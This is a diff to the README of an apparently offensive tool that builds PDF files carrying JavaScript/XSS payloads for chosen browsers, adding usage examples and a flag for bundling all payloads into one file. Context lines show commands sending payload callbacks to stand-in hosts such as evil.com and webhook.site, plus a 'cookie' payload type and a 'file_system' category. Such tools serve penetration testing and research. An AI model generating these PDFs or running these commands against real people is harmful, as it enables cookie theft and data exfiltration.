@@ -116,8 +116,17 @@ python3 script.py -b all -u https://webhook.site/xyz
 # Target specific payload category
 python3 script.py -b firefox --category file_system -u http://evil.com
 
+# Create single file with ALL payloads for Chrome browser
+python3 script.py -b chrome --browser-specific-file -u http://test.com
+
+# Create single file with ALL Firefox payloads
+python3 script.py -b firefox --browser-specific-file
+
 # Use the alternative script for browser-specific PDFs
 python3 Another-Script.py -b chrome -u http://test.com
+
+# Alternative script: Create single file with all Chrome payloads
+python3 Another-Script.py -b chrome --browser-specific-file -u http://test.com
 ```
 
 ## 🏁 Command Line Flags
@@ -130,6 +139,7 @@ python3 Another-Script.py -b chrome -u http://test.com
 | `-s` | `--script` | Custom JavaScript payload | `-s "app.alert('test')"` |
 | `-t` | `--type` | XSS payload type or 'all' | `-t cookie` |
 | `-b` | `--browser` | Target browser (chrome/firefox/safari/edge/adobe/all) | `-b chrome` |
+| | `--browser-specific-file` | Create single file with ALL payloads for specified browser | `--browser-specific-file` |
 | | `--list-types` | List available payload types | `--list-types` |
 
 ## 📁 Output Files
